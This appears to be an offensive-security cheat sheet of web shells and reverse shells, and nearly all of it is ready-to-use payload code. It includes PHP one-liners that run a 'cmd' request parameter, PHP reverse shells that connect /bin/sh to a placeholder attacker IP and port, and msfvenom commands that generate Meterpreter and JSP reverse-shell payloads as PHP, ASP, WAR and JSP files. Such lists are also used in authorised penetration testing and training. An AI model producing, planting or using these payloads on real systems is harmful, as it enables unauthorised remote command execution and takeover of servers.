# Web Shells

## PHP Shells

```php
<?php system($_REQUEST['cmd']); ?>
123.php?cmd=[COMMAND]
```
```php
<?php echo shell_exec($_REQUEST["cmd"]); ?>
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);system("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);passthru("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("[IP]",[PORT]);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

## Meterpreter Reverse Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].php; cat [NAME].php | pbcopy && echo '<?php ' | tr -d '\n' > [NAME].php && pbpaste >> [NAME].php
```

##### PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].php
```

##### ASP/ASPX
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > [NAME].asp
```

##### WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > [NAME].war
```

##### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].jsp
```
